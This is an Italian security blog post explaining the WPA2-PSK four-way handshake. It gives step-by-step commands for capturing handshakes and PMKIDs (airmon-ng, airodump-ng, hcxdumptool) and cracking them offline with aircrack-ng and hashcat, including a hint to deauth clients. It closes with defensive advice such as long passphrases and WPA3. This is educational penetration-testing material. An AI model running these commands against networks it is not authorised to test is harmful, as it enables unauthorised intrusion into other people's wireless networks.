---
layout: post
title: "Sicurezza WiFi: attacchi WPA2 e come proteggere la rete wireless"
date: 2026-06-08
cat: red
tags: [WiFi, WPA2, handshake, hashcat, aircrack-ng, PMKID, wireless security]
excerpt: "WPA2 è lo standard wireless più diffuso. Come funziona l'autenticazione, cos'è il four-way handshake, come si cattura e come si analizza la robustezza della propria password."
---

Il wireless è spesso il perimetro più poroso di una rete. WPA2-PSK (Personal), usato in casa e in molte PMI, è vulnerabile ad attacchi offline di password cracking se la PSK è debole. Capire come funziona è essenziale per configurarlo correttamente.

## Come funziona WPA2-PSK

L'autenticazione WPA2-PSK si basa sul **four-way handshake**: una sequenza di 4 messaggi tra client e access point che verifica che entrambi conoscano la PSK senza trasmetterla in chiaro.

```
Client          Access Point
  |  ←— EAPOL-Key (ANonce) ——  |
  |  ——— EAPOL-Key (SNonce) →  |
  |  ←— EAPOL-Key (GTK) ———  |
  |  ——— EAPOL-Key (ACK) ——→  |
```

Dal handshake è possibile derivare un valore (**MIC** - Message Integrity Code) che dipende dalla PSK. Se si cattura il handshake, è possibile tentare offline: "con questa password, il MIC corrisponderebbe?" — senza bisogno di interagire con l'AP.

## Cattura del handshake (solo su reti autorizzate)

```bash
# Metti la scheda in monitor mode
airmon-ng start wlan0

# Scansiona le reti
airodump-ng wlan0mon

# Cattura il traffico del target (BSSID e canale dalla scan)
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Aspetta un client che si connette (o invia deauth per forzare riconnessione)
# Il handshake viene visualizzato in alto a destra nell'output
```

## PMKID Attack — senza aspettare il handshake

Più moderno: il PMKID è un valore nel primo pacchetto EAPOL, derivato dalla PSK. Non serve aspettare un client:

```bash
# hcxdumptool — cattura PMKID
hcxdumptool -i wlan0mon --enable_status=1 -o capture.pcapng

# Converti per hashcat
hcxpcapngtool -o hash.txt capture.pcapng

# Cracking
hashcat -m 22000 hash.txt rockyou.txt
hashcat -m 22000 hash.txt rockyou.txt --rules-file best64.rule
```

## Password cracking offline

```bash
# aircrack-ng
aircrack-ng -w rockyou.txt capture-01.cap

# hashcat — molto più veloce con GPU
# Converti il cap in formato hashcat
cap2hccapx capture-01.cap capture.hccapx
hashcat -m 2500 capture.hccapx rockyou.txt

# Attacco a maschera (es. 8 cifre)
hashcat -m 2500 capture.hccapx -a 3 ?d?d?d?d?d?d?d?d
```

## WPA2 Enterprise — molto più sicuro

WPA2-Enterprise usa RADIUS e certificati invece di PSK. Ogni utente ha credenziali proprie. Molto più robusto per ambienti aziendali.

## Difesa: come scegliere una PSK robusta

- **Lunghezza**: minimo 20 caratteri
- **Complessità**: mix di caratteri, no parole di dizionario
- **WPA3**: dove supportato dai dispositivi, preferire WPA3-SAE che risolve la vulnerabilità al cracking offline
- **Monitoraggio**: sistemi WIDS (Wireless Intrusion Detection) rilevano scan e deauth
- **Reti separate**: IoT su VLAN dedicata, non sulla rete principale
